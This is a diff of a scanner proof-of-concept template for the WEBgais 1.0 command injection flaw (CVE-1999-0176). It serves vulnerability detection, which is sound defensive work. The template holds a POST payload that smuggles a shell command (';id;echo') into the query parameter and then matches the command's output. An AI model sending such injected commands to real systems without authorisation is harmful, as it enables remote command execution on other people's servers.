@@ -1,17 +1,22 @@
 [info]
-author = "ave"
-description = "检测 WEBgais 1.0 远程命令执行漏洞（CVE-1999-0176）。/cgi-bin/webgais CGI 脚本对 query 参数过滤不严，通过 POST 传入特制 payload 可执行任意系统命令"
+author = "AVE"
+description = "WEBgais 1.0 CGI 程序未正确过滤 query 参数中的 shell 元字符，导致远程命令执行。发送包含 ';id;echo' 的 POST 请求，若响应中包含 id 命令输出则存在漏洞。"
 id = "POC-AVE-1999-0351"
-name = "WEBgais 1.0 Remote Command Execution PoC"
+name = "WEBgais 1.0 远程命令执行漏洞 PoC"
 severity = "high"
-tags = ["ave-1999-0351"]
+tags = [
+    "cve-1999-0176",
+    "webgais",
+    "cgi",
+    "rce",
+]
 vuln_id = [
     "CVE-1999-0176",
     "AVE-1999-0351",
 ]
 
 [poc]
-logic = "any"
+logic = "all"
 
 [[poc.requests]]
 method = "POST"
@@ -22,8 +27,14 @@ protocol = "http"
 content = "query=';id;echo'&output=subject&domain=paragraph"
 type = "raw"
 
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
-words = ["uid="]
+words = [
+    "uid=",
+    "gid=",
+]
